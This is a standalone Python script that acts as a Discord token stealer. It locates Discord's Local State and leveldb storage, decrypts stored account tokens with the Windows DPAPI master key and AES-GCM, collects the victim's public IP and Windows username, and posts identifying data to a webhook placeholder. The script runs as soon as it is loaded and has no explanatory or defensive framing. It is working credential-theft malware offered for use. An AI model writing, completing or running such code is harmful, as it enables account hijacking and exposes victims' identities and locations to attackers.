import os
import json
import base64
import requests
import win32crypt
from Cryptodome.Cipher import AES
import re

WEBHOOK_URL = "WEBHOOK HERE"

def get_ip():
    return requests.get("https://api.ipify.org").text

def get_master_key(path):
    with open(path, "r", encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_token(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)[:-16].decode()
        return decrypted
    except:
        return None

def find_tokens(path, master_key):
    if not os.path.exists(path): return []

    for filename in os.listdir(path):
        if not filename.endswith(".ldb") and not filename.endswith(".log"):
            continue

        with open(os.path.join(path, filename), "r", errors="ignore") as file:
            for line in file:
                line = line.strip()
                for match in re.findall(r'dQw4w9WgXcQ:[^\"]+', line):
                    try:
                        b64 = match.split("dQw4w9WgXcQ:")[1]
                        decoded = base64.b64decode(b64)
                        token = decrypt_token(decoded, master_key)
                        if token:
                            return token
                    except:
                        continue
    return None

def get_first_discord_token():
    paths = [
        os.getenv("APPDATA") + "\\discord",
        os.getenv("APPDATA") + "\\discordcanary",
        os.getenv("APPDATA") + "\\discordptb"
    ]

    for path in paths:
        if not os.path.exists(path): 
            continue

        local_state_path = os.path.join(path, "Local State")
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")

        if not os.path.exists(local_state_path): 
            continue

        try:
            master_key = get_master_key(local_state_path)
            token = find_tokens(leveldb_path, master_key)
            if token:
                return token
        except:
            continue

    return None

def send_webhook(ip, user, token):
    first_part = token.split('.')[0]

    try:
        decoded_id = base64.b64decode(first_part + '==').decode()
    except Exception:
        decoded_id = first_part

    data = {
        "content": f"```json\n{{\n  \"ipAddress\": \"{ip}\",\n  \"winProfileName\": \"{user}\",\n  \"discordUserID\": \"{decoded_id}\"\n}}```"
    }
    requests.post(WEBHOOK_URL, json=data)

def main():
    ip = get_ip()
    user = os.getlogin()
    token = get_first_discord_token()
    if token:
        send_webhook(ip, user, token)

main()